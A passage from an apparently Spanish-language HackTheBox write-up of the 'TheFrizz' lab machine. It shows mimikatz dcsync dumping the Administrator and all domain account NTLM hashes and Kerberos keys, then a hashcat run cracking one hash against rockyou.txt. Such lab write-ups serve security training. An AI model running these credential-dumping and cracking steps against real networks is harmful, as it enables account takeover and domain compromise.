</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;mimikatz.exe
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c1">#19041 Sep 19 2022 17:44:08</span>
</span></span><span class="line"><span class="cl"> .## ^ <span class="c1">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
</span></span><span class="line"><span class="cl"> <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
</span></span><span class="line"><span class="cl"> <span class="c1">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
</span></span><span class="line"><span class="cl"> <span class="s1">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;#####&#39;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mimikatz <span class="c1"># lsadump::dcsync /domain:frizz.htb /user:administrator</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;frizz.htb&#39;</span> will be the domain
</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;frizzdc.frizz.htb&#39;</span> will be the DC server
</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;administrator&#39;</span> will be the user account
</span></span><span class="line"><span class="cl"><span class="o">[</span>rpc<span class="o">]</span> Service  : ldap
</span></span><span class="line"><span class="cl"><span class="o">[</span>rpc<span class="o">]</span> AuthnSvc : GSS_NEGOTIATE <span class="o">(</span>9<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Object RDN           : Administrator
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">** SAM ACCOUNT **
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SAM Username         : Administrator
</span></span><span class="line"><span class="cl">Account Type         : <span class="m">30000000</span> <span class="o">(</span> USER_OBJECT <span class="o">)</span>
</span></span><span class="line"><span class="cl">User Account Control : <span class="m">00000200</span> <span class="o">(</span> NORMAL_ACCOUNT <span class="o">)</span>
</span></span><span class="line"><span class="cl">Account expiration   : 
</span></span><span class="line"><span class="cl">Password last change : 2/25/2025 2:24:10 PM
</span></span><span class="line"><span class="cl">Object Security ID   : S-1-5-21-2386970044-1145388522-2932701813-500
</span></span><span class="line"><span class="cl">Object Relative ID   : <span class="m">500</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Credentials:
</span></span><span class="line"><span class="cl">  Hash NTLM: c457b5f1c315bef53b9cabc92e993d0b
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Supplemental Credentials:
</span></span><span class="line"><span class="cl">* Primary:NTLM-Strong-NTOWF *
</span></span><span class="line"><span class="cl">    Random Value : 6ac5eaf7ead889fd0d041016f94ddafd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Primary:Kerberos-Newer-Keys *
</span></span><span class="line"><span class="cl">    Default Salt : FRIZZ.HTBAdministrator
</span></span><span class="line"><span class="cl">    Default Iterations : <span class="m">4096</span>
</span></span><span class="line"><span class="cl">    Credentials
</span></span><span class="line"><span class="cl">      aes256_hmac       <span class="o">(</span>4096<span class="o">)</span> : ccacae8e6d2659abd32d29c125b93cf8d434c2ceb5a144e4c01807cb6f6eaf89
</span></span><span class="line"><span class="cl">      aes128_hmac       <span class="o">(</span>4096<span class="o">)</span> : e3b797c9257b571573fd413000881faf
</span></span><span class="line"><span class="cl">      des_cbc_md5       <span class="o">(</span>4096<span class="o">)</span> : 3e1594979e2980a7
</span></span><span class="line"><span class="cl">    OldCredentials
</span></span><span class="line"><span class="cl">      aes256_hmac       <span class="o">(</span>4096<span class="o">)</span> : de848bb92b49f090ff525477379ec7dab350b5a3d879e3463b356cf6b9037744
</span></span><span class="line"><span class="cl">      aes128_hmac       <span class="o">(</span>4096<span class="o">)</span> : 8629d37b0c2c52f689664c1e5dc30f41
</span></span><span class="line"><span class="cl">      des_cbc_md5       <span class="o">(</span>4096<span class="o">)</span> : 9113ea64aecbc480
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Primary:Kerberos *
</span></span><span class="line"><span class="cl">    Default Salt : FRIZZ.HTBAdministrator
</span></span><span class="line"><span class="cl">    Credentials
</span></span><span class="line"><span class="cl">      des_cbc_md5       : 3e1594979e2980a7
</span></span><span class="line"><span class="cl">    OldCredentials
</span></span><span class="line"><span class="cl">      des_cbc_md5       : 9113ea64aecbc480
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Packages *
</span></span><span class="line"><span class="cl">    NTLM-Strong-NTOWF
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Primary:WDigest *
</span></span><span class="line"><span class="cl">    <span class="m">01</span>  2a644381ab0bbc9cfd87dc35c495c0ae
</span></span><span class="line"><span class="cl">    <span class="m">02</span>  956abddcbd1a40e58e734fd5a45da951
</span></span><span class="line"><span class="cl">    <span class="m">03</span>  ebe417048be44a012e4a38e03ef28887
</span></span><span class="line"><span class="cl">    <span class="m">04</span>  2a644381ab0bbc9cfd87dc35c495c0ae
</span></span><span class="line"><span class="cl">    <span class="m">05</span>  9748959c8802be42b0e4732291696999
</span></span><span class="line"><span class="cl">    <span class="m">06</span>  0c927848e3f67c1b7b3b484a4881d3e8
</span></span><span class="line"><span class="cl">    <span class="m">07</span>  c7e7858542342b1de624708fbc313973
</span></span><span class="line"><span class="cl">    <span class="m">08</span>  281ff172032bba7a89c0fcbe380dbd10
</span></span><span class="line"><span class="cl">    <span class="m">09</span>  50bba77ee23a5010fb5777816cc04da5
</span></span><span class="line"><span class="cl">    <span class="m">10</span>  796c79776c4ed1c69a8a4101453832e5
</span></span><span class="line"><span class="cl">    <span class="m">11</span>  c24de888b26aaf965130e1d4563503dc
</span></span><span class="line"><span class="cl">    <span class="m">12</span>  281ff172032bba7a89c0fcbe380dbd10
</span></span><span class="line"><span class="cl">    <span class="m">13</span>  55feb01a735bdf189551c8d5d51b5c5a
</span></span><span class="line"><span class="cl">    <span class="m">14</span>  8bcf486a061993767b8b15693bf84900
</span></span><span class="line"><span class="cl">    <span class="m">15</span>  de427ec0febef355fb3b8e7db6d10f99
</span></span><span class="line"><span class="cl">    <span class="m">16</span>  4cf3b6b64c6737f3ce4e91e637173508
</span></span><span class="line"><span class="cl">    <span class="m">17</span>  b2f0e25cdcfc14142b66e387af4d337a
</span></span><span class="line"><span class="cl">    <span class="m">18</span>  3e0388f1021baaa2c3f56db300b9a546
</span></span><span class="line"><span class="cl">    <span class="m">19</span>  b2f92346f0c33847b0cdf6dedc63eb3c
</span></span><span class="line"><span class="cl">    <span class="m">20</span>  469c58bd998799e0cdabfd145a13da59
</span></span><span class="line"><span class="cl">    <span class="m">21</span>  30a9f5e7c2cf6e14ea5b17dd85302b5c
</span></span><span class="line"><span class="cl">    <span class="m">22</span>  06c21c6ab5fc20d0adffade0e568b486
</span></span><span class="line"><span class="cl">    <span class="m">23</span>  2e6c12c688783dc66cfc90bfe0b33db7
</span></span><span class="line"><span class="cl">    <span class="m">24</span>  30646a9711fd7944d1deefef9b649dd7
</span></span><span class="line"><span class="cl">    <span class="m">25</span>  ebd62686a42b1d60caf377db610f7cd6
</span></span><span class="line"><span class="cl">    <span class="m">26</span>  b45658d8d1776efa2910c9a3c62fc850
</span></span><span class="line"><span class="cl">    <span class="m">27</span>  3f50d34b42a7fa72d9e40511c6d67728
</span></span><span class="line"><span class="cl">    <span class="m">28</span>  036fe1e7ca0bad673cd83a0104a609f2
</span></span><span class="line"><span class="cl">    <span class="m">29</span>  a02a88693bf5446aee8c6a4895d410ee
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mimikatz <span class="c1"># lsadump::dcsync /domain:frizz.htb /ALL /CSV</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;frizz.htb&#39;</span> will be the domain
</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> <span class="s1">&#39;frizzdc.frizz.htb&#39;</span> will be the DC server
</span></span><span class="line"><span class="cl"><span class="o">[</span>DC<span class="o">]</span> Exporting domain <span class="s1">&#39;frizz.htb&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>rpc<span class="o">]</span> Service  : ldap
</span></span><span class="line"><span class="cl"><span class="o">[</span>rpc<span class="o">]</span> AuthnSvc : GSS_NEGOTIATE <span class="o">(</span>9<span class="o">)</span>
</span></span><span class="line"><span class="cl">1104	w.li	1c113211987ca6a9184503b179d9dfaa	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1105	h.arm	8b3055495e80f8ee7d997f7d7a55b4c0	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1107	d.hudson	91cf151e936fc93c86698657b4295460	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1108	k.franklin	ccfe55e7aa51899f936930f0c200b6c7	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1109	l.awesome	0d27457ae284988aa5ec067341e22ff3	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1110	t.wright	e952ad2c22fc30cf9ddaa1b9794f833d	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1111	r.tennelli	1e47cb7e5d7ac4ec0dc32200f2948ca4	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1112	J.perlstein	445f11ff2a95e05a1d5122a6d798de7d	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1113	a.perlstein	b61979d08c7b2d5b641f3be3645f3ec8	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1114	p.terese	2803a7b3088798bc8457e8e327eae454	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1116	g.frizzle	ad45f1a39d0aad8b715ed02cfd61d564	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1117	c.sandiego	1ba512662862a494c993888ff8a5581d	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1118	c.ramon	a206853184aca2d030a57011786c7f37	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1119	m.ramon	7576c7d46f8a0512a1eeba70bb424a41	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">502	krbtgt	f2555a6cd2c4f0a1d8c08b78c9b3f15e	<span class="m">514</span>
</span></span><span class="line"><span class="cl">1120	w.Webservice	4382bdea116a67dfac27f11028733ba1	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">500	Administrator	c457b5f1c315bef53b9cabc92e993d0b	<span class="m">512</span>
</span></span><span class="line"><span class="cl">1115	v.frizzle	98efe5a306ed7ce343a4820027e2f3f7	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1106	M.SchoolBus	c5127655f826fd8fbf09b90ae0795906	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1103	f.frizzle	96198b704e6586b657fd425c7baaf105	<span class="m">66048</span>
</span></span><span class="line"><span class="cl">1000	FRIZZDC$	04b0cbdc4a8d43605f45f881f07054a2	<span class="m">532480</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mimikatz <span class="c1">#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Hashcat con el wordlist rockyou.txt unicamente muestran un valor de hash.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">96198b704e6586b657fd425c7baaf105:Jenni_Luvs_Magic23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\s</span>ckull<span class="se">\D</span>ocuments<span class="se">\h</span>ashcat-6.2.6&gt; .<span class="se">\h</span>ashcat.exe -m <span class="m">1000</span> ..<span class="se">\h</span>ash<span class="se">\f</span>rizz_hashes .<span class="se">\r</span>ockyou.txt
</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>..<span class="o">]</span> snip <span class="o">[</span>..<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Optimizers applied:
</span></span><span class="line"><span class="cl">* Zero-Byte
</span></span><span class="line"><span class="cl">* Early-Skip
</span></span><span class="line"><span class="cl">* Not-Salted
</span></span><span class="line"><span class="cl">* Not-Iterated
</span></span><span class="line"><span class="cl">* Single-Salt
</span></span><span class="line"><span class="cl">* Raw-Hash
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> backend kernels selected.
</span></span><span class="line"><span class="cl">Pure kernels can crack longer passwords, but drastically reduce performance.
</span></span><span class="line"><span class="cl">If you want to switch to optimized kernels, append -O to your commandline.
</span></span><span class="line"><span class="cl">See the above message to find out about the exact limits.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Watchdog: Temperature abort trigger <span class="nb">set</span> to 90c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host memory required <span class="k">for</span> this attack: <span class="m">421</span> MB
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Dictionary cache hit:
</span></span><span class="line"><span class="cl">* Filename..: .<span class="se">\r</span>ockyou.txt
</span></span><span class="line"><span class="cl">* Passwords.: <span class="m">14344385</span>
</span></span><span class="line"><span class="cl">* Bytes.....: <span class="m">139921507</span>
</span></span><span class="line"><span class="cl">* Keyspace..: <span class="m">14344385</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">96198b704e6586b657fd425c7baaf105:Jenni_Luvs_Magic23
</span></span><span class="line"><span class="cl">Approaching final keyspace - workload adjusted.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Exhausted
</span></span><span class="line"><span class="cl">Hash.Mode........: <span class="m">1000</span> <span class="o">(</span>NTLM<span class="o">)</span>
</span></span><span class="line"><span class="cl">Hash.Target......: ..<span class="se">\h</span>ash<span class="se">\f</span>rizz_hashes
</span></span><span class="line"><span class="cl">Time.Started.....: Fri Mar <span class="m">28</span> 01:49:25 <span class="m">2025</span> <span class="o">(</span><span class="m">1</span> sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Fri Mar <span class="m">28</span> 01:49:26 <span class="m">2025</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>.<span class="se">\r</span>ockyou.txt<span class="o">)</span>
</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
</span></span><span class="line"><span class="cl">Speed.#1.........: 25525.9 kH/s <span class="o">(</span>2.40ms<span class="o">)</span> @ Accel:1024 Loops:1 Thr:64 Vec:1
</span></span><span class="line"><span class="cl">Recovered........: 1/21 <span class="o">(</span>4.76%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/21 <span class="o">(</span>4.76%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress.........: 14344385/14344385 <span class="o">(</span>100.00%<span class="o">)</span>
</span></span><span class="line"><span class="cl">Rejected.........: 0/14344385 <span class="o">(</span>0.00%<span class="o">)</span>
</span></span><span class="line"><span class="cl">Restore.Point....: 14344385/14344385 <span class="o">(</span>100.00%<span class="o">)</span>
</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
</span></span><span class="line"><span class="cl">Candidates.#1....: <span class="nv">$HEX</span><span class="o">[</span>303231334a52<span class="o">]</span> -&gt; <span class="nv">$HEX</span><span class="o">[</span>042a0337c2a156616d6f732103<span class="o">]</span>
</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 46c Fan:  0% Util: 38% Core:2505MHz Mem:8250MHz Bus:8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Started: Fri Mar <span class="m">28</span> 01:49:24 <span class="m">2025</span>
</span></span><span class="line"><span class="cl">Stopped: Fri Mar <span class="m">28</span> 01:49:27 <span class="m">2025</span>
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\s</span>ckull<span class="se">\D</span>ocuments<span class="se">\h</span>ashcat-6.2.6&gt;
</span></span></code></pre></td></tr></table>
</div>
</div>
    </article>
    
    <script>
  'use strict';
  
  function wrap(el, wrapper) {
    el.parentNode.insertBefore(wrapper, el);
    wrapper.appendChild(el);
  }

  (function () {
    var singleContentsElem = document.querySelector('.single__contents');
    singleContentsElem ? 
    singleContentsElem.querySelectorAll('pre > code').forEach(function(elem) {
      var dataLang = elem.getAttribute('data-lang');
      var dataLangWrapper = document.createElement('div');
      var code = null;
      var codeTitle = null;

      if (dataLang && dataLang.includes(':')) {
        code = dataLang.split(':')[0];
        codeTitle = dataLang.split(':')[1];

        dataLangWrapper.className = 'language-' + code;
        dataLangWrapper.setAttribute('data-lang', codeTitle);

        elem.className = 'language-' + code;
        elem.setAttribute('data-lang', codeTitle);
        elem.setAttribute('id', codeTitle);
      } else if (!dataLang) {
        dataLangWrapper.setAttribute('data-lang', 'Code');
        dataLangWrapper.className = 'language-code';
      }

      if (!dataLang || codeTitle) {
        wrap(elem.parentNode, dataLangWrapper);
      }

    }) : null;
  })();

  var langCodeElem = document.querySelectorAll('.language-code');
  langCodeElem ? langCodeElem.forEach(function (elem) {
    var newElem = document.createElement('span');
    newElem.className = 'copy-to-clipboard';
    newElem.setAttribute('title', 'Copy to clipboard');
    elem.append(newElem);
  }) : null;
  
</script>
    
<div class="donation">
  <div class="donation__message">
    Share on
  </div>
  <div class="donation__icons">
    
    
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsckull.github.io%2fposts%2fthefrizz%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
        </a>
      
    
      
        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsckull.github.io%2fposts%2fthefrizz%2f&title=HackTheBox%20-%20TheFrizz &summary=TheFrizz%20corre%20Gibbon%20con%20una%20version%20vulnerable%20que%20tras%20un%20analisis%20de%20codigo%20logramos%20la%20ejecucion%20de%20comandos.%20Realizamos%20Port%20Forwarding%20para%20acceder%20al%20puerto%20de%20la%20base%20de%20datos%20y%20obtener%20credenciales%20en%20esta%20que%20permitieron%20ingresar%20por%20SSH%20mediante%20Kerberos.%20Descubrimos%20una%20contrasena%20dentro%20de%20un%20backup%20para%20el%20acceso%20a%20un%20segundo%20usuario.%20Este%20ultimo%2c%20pertenece%20al%20grupo%20%27Group%20Policy%20Creator%20Owners%27%20por%20lo%20que%20creamos%20un%20objeto%20%27vulnerable%27%20para%20luego%20con%20SharpGPOAbuse%20ejecutar%20comandos%20que%20finalmente%20nos%20dio%20acceso%20como%20administrador.&source=Walkthrough%20-%20Writeups%20%3a%3a%20TryHackMe%2c%20HackTheBox%2c%20CTFs%2c%20espa%c3%b1ol%20-%20sckull" target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
          <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z"/><path d="m.396 7.977h4.976v16.023h-4.976z"/><path d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z"/></svg>
        </a>
      
    
      
        <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20TheFrizz&url=https%3a%2f%2fsckull.github.io%2fposts%2fthefrizz%2f&hashtags=Gibbonv25%2clfi%2cphp%2cphp-fopen%2cmysql%2cchisel%2cnetexec%2cbloodhound-python%2cimpacket-getTGT%2cssh-kerberos%2cbackup%2cwapt%2cpassword-spraying%2cGPO-abuse%2cevil-GPO%2cSharpGPOAbuse%2cmimikatz%2chashcat&via=%40sckull_" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
        </a>
      
    
  </div>
</div>

    
    
<div class="whoami__gutter"></div>
<hr class="hr-slash whoami-hr"/>
<section class="whoami">
  <div class="whoami__image-wrapper">
    
    
      
        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="Dany Sucuc" class="lazyload whoami__image"/>
      
    
  </div>
  <div class="whoami__contents">
    <div class="whoami__written-by">
      WRITTEN BY
    </div>
    <div class="whoami__title">
      
        sckull
      
    </div>
    <div class="whoami__desc">
      
        
      
    </div>
    <div class="whoami__social">
      
      
      
      
      <a href="https://discordapp.com/users/560543197466722314" title="discord" aria-label="discord">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 512 512" aria-label="Discord" version="1.1"> 
 <path d="m386 137c-24-11-49.5-19-76.3-23.7c-.5 0-1 0-1.2.6c-3.3 5.9-7 13.5-9.5 19.5c-29-4.3-57.5-4.3-85.7 0c-2.6-6.2-6.3-13.7-10-19.5c-.3-.4-.7-.7-1.2-.6c-23 4.6-52.4 13-76 23.7c-.2 0-.4.2-.5.4c-49 73-62 143-55 213c0 .3.2.7.5 1c32 23.6 63 38 93.6 47.3c.5 0 1 0 1.3-.4c7.2-9.8 13.6-20.2 19.2-31.2c.3-.6 0-1.4-.7-1.6c-10-4-20-8.6-29.3-14c-.7-.4-.8-1.5 0-2c2-1.5 4-3 5.8-4.5c.3-.3.8-.3 1.2-.2c61.4 28 128 28 188 0c.4-.2.9-.1 1.2.1c1.9 1.6 3.8 3.1 5.8 4.6c.7.5.6 1.6 0 2c-9.3 5.5-19 10-29.3 14c-.7.3-1 1-.6 1.7c5.6 11 12.1 21.3 19 31c.3.4.8.6 1.3.4c30.6-9.5 61.7-23.8 93.8-47.3c.3-.2.5-.5.5-1c7.8-80.9-13.1-151-55.4-213c0-.2-.3-.4-.5-.4Zm-192 171c-19 0-34-17-34-38c0-21 15-38 34-38c19 0 34 17 34 38c0 21-15 38-34 38zm125 0c-19 0-34-17-34-38c0-21 15-38 34-38c19 0 34 17 34 38c0 21-15 38-34 38z" fill="currentColor"/>
</svg>
      </a>
      
      
      
      
      
      
      
      <a href="https://github.com/sckull" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
